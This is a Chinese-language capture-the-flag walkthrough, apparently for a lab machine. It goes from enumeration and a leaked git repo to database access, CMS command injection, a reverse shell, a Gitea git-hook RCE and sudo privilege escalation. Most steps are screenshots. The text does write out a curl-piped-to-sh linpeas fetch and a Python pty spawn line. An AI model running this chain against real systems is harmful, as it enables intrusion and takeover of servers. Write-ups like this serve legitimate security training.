- 先把主機加入/etc/hosts
- 
![](https://hackmd.io/_uploads/ryGl8WTza.png)

- 用nmap掃有開啟甚麼port 有22跟80
- 
![](https://hackmd.io/_uploads/B1ufUZazT.png)

- 再用dirsearch看看有沒有甚麼可用資訊 看起來是有git可以用 還有一個backend/auth的網頁
- 
![](https://hackmd.io/_uploads/rknVUbTf6.png)

![](https://hackmd.io/_uploads/HkRqo-afa.png)


- 用gihacker把源碼下載下來
- 
![](https://hackmd.io/_uploads/rJu1DZ6z6.png)

- 看看裡面有什麼可以用的 首先發現adminer.php 連進去後可以進到一個db的登入頁面
- 
![](https://hackmd.io/_uploads/rJ4ot-aGp.png)

- 於是來去翻看看有沒有關於db的資料，在config裡的database.php找到一個用戶的登入密碼

  
![](https://hackmd.io/_uploads/rJLYFbTGT.png)

- 拿到剛剛的登入頁面進行登入，成功登入資料庫
- 
![](https://hackmd.io/_uploads/SknCKW6MT.png)

- 在select backend_user的地方發現一個叫Frank的user
- 
![](https://hackmd.io/_uploads/BkEyhZazp.png)

- 用hash-identifier查看是甚麼類型的加密問不到
- 
![](https://hackmd.io/_uploads/B1-LpW6fa.png)

- 用chatgpt問後發現是BCrypt加密
- 
![](https://hackmd.io/_uploads/S1bdpZ6Mp.png)

- 此時就可以去透過BCrypt去生成自己的密碼並去把它替換掉
- 
![](https://hackmd.io/_uploads/rkfRpWpGa.png)

![](https://hackmd.io/_uploads/B15eAZaza.png)

- 拿去一開始發現的backend/auth網站登入看看 可以成功登入
- 
![](https://hackmd.io/_uploads/H1ESCbafp.png)

- 進去後有CMS系統，CMS（Content Management System）意思是內容管理系統，掌管網站後台的編輯、新增、儲存和組織功能，因此可以去嘗試在裏頭寫入一些惡意code
- 
![](https://hackmd.io/_uploads/HyPF1BRf6.png)

- 先去查看他的phpinfo裡的disable_function有禁用哪些
- 
![](https://hackmd.io/_uploads/r1ac6r0M6.png)

![](https://hackmd.io/_uploads/BkO66BAMa.png)

- 發現沒有禁用system()，嘗試後發現可以使用 能看到id身分 (為什麼1可以，其他數字不行)
- 
![](https://hackmd.io/_uploads/HJGxArCGT.png)


- 去嘗試寫個reverse shell進去 &記得要改成%26不然會被當參數傳過去 bin/bash -c 意思是告訴bash shell執行-c 後面的命令列，允許在不啟動交互式Shell會話的情況下執行單個命令
- 
![](https://hackmd.io/_uploads/B1c-GICMp.png)

- 成功監聽到
- 
![](https://hackmd.io/_uploads/ByjYMI0z6.png)

- 有一個網址沒掃到 用nmap -A 去掃(全面系統檢測、啟用腳本檢測、掃描等) 發現他有開8585 port
- 
![](https://hackmd.io/_uploads/ByhDBUCGa.png)

- 這個也不錯 這樣可以掃1到9999port
- 
![](https://hackmd.io/_uploads/SyVHUIRfT.png)

- 進去後發現gitea 所以可以去找看看有沒有關於gitea的設定
- 
![](https://hackmd.io/_uploads/rJRqIIRMa.png)

- 用Linpeas找看看有什麼可以使用的地方
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
![](https://hackmd.io/_uploads/r1ErUwCG6.png)

- 有找到一個像是gitea設定黨的東西
- 
![](https://hackmd.io/_uploads/B1x_zuw0GT.png)

- 可是沒有權限 所以要去找看看有沒有別的可以用
- 
![](https://hackmd.io/_uploads/Hk0L9D0M6.png)

- 還有一個bak檔 這有點像是可以用來復原網站的文件
- 
![](https://hackmd.io/_uploads/Bk_55v0Mp.png)

- 有發現一組db的帳號密碼 把它拿去並登入 就有發現frank gitea的帳號密碼 拿去修改並登入gitea
- 
![](https://hackmd.io/_uploads/rkBvivCMa.png)

- 成功登入gitea
- 
![](https://hackmd.io/_uploads/HyRFTwCfp.png)

- 查看這個的版本號是1.12.5 去查看看有沒有相關漏洞 找到一個RCE的[漏洞](https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce)
- 
![](https://hackmd.io/_uploads/rJvvI9Czp.png)

- 在githook加上reverse shell
- 
![](https://hackmd.io/_uploads/ryktO5Czp.png)

- 開啟一個監聽
- 
![](https://hackmd.io/_uploads/BkQJF9RzT.png)

- 然後在readme加個空格然後update
- 
![](https://hackmd.io/_uploads/BJCbY5AGp.png)

- 就成功以frank的身分進入了
- 
![](https://hackmd.io/_uploads/H1mLKqAGa.png)

- sudo -l 發現可以透過sqlite3提權
- 
![](https://hackmd.io/_uploads/Sy2dYqRMp.png)

- 在GTFOBins找sqlite3提權方法
- 
![](https://hackmd.io/_uploads/rkj1jq0Ga.png)

- 貼上後沒有說沒有tty 所以幫他加一個 
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
![](https://hackmd.io/_uploads/Hk6WoqAMp.png)

- 加上再試試後發現要密碼
- 
![](https://hackmd.io/_uploads/rk_Sj9Rzp.png)

- 去查一下後發現是sudo 的問題 會被擋掉 所以改成sudo -u#-1來繞過他 就可以成功提權了
- 
![](https://hackmd.io/_uploads/ry7XT9Aza.png)

